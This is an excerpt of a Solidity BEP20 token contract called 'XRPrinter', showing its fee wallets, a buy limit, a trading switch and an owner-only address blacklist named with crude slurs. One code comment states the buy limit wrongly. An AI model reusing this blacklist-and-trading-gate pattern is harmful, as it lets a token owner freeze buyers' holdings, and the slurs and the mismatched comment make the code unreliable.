...
/* Token contract */
contract XRPrinter is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x52E14D27d2DE6C14342235eFF0102E8314cB07A6;
    ...
    // Name and symbol
    string constant _name = "XRPrinter";
    string constant _symbol = "PRINTX";
    ...
    uint256 _totalSupply = 1000000 * 10**0 * (10 ** _decimals);
     ...
     // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 200 / 10000; // 1.5% on launch or 1M tokens
    ...
    mapping (address => bool) public isShitface;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x9Dcf6Ca272204E2e9165b5a5264D7B193167Aa2e;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not enabled yet shitface");
        }

        // Check if address is retard
        require(!isShitface[recipient] && !isShitface[sender], 'Address is Shitface');
    ...
    // shitface/unshitface an address :)
    function shiFacetAddress(address _address, bool _value) public authorized{
        isShitface[_address] = _value;
    }
